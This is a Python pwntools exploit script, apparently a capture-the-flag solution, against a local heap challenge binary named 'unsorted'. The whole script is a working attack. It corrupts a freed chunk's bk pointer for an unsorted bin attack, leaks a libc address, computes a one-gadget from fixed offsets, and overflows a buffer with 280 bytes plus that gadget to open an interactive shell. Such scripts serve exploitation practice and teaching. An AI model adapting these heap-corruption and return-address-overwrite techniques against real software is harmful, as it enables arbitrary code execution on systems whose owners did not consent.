# unsorted.py
from pwn import *
p = process("./unsorted")


def add(data):
	print p.sendlineafter(">", "1")
	print p.sendlineafter(":", str(data))


def free(idx):
	print p.sendlineafter(">", "2")
	print p.sendlineafter(":", str(idx))


def edit(idx, data):
	print p.sendlineafter(">", "3")
	print p.sendlineafter(":", str(idx))
	print p.sendlineafter(":", str(data))


def print_name():
	print p.sendlineafter(">", "4")


def overflow(data):
	print p.sendlineafter(">", "5")
	print p.sendlineafter("", str(data))


elf = ELF('unsorted')
name = elf.symbols['name']

add("AAAA")
add("AAAA")
free(0)
edit(0, "A"*8 + p64(name-0x10))  # bk overwrite
add("AAAA")
print_name()
print p.recvuntil("Name: ")
unsorted_chunks = u64(p.recv(6).ljust(8, "\x00"))
libc_base = unsorted_chunks - 0x3c4b78
oneshot = libc_base + 0xf1147
print hex(unsorted_chunks)
payload = "A"*280
payload += p64(oneshot)
overflow(payload)
p.interactive()
